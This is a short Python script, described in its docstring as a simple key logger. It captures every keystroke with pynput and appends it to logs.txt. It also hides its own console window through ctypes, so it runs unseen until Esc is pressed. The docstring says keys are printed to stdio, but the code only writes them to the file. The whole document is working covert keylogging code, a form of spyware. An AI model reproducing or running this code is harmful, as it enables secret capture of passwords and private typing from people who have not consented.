'''
A simple key logger, print the key to the stdio and output the key strokes in logs.txt

'''
from pynput.keyboard import Key, Listener
import ctypes
import os
import win32process

hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
if hwnd != 0:      
    ctypes.windll.user32.ShowWindow(hwnd, 0)

def on_press(key):
    f = open("logs.txt", "a")
    f.write('{0}'.format(key))
    f.write('\n')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Collect events until released
with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()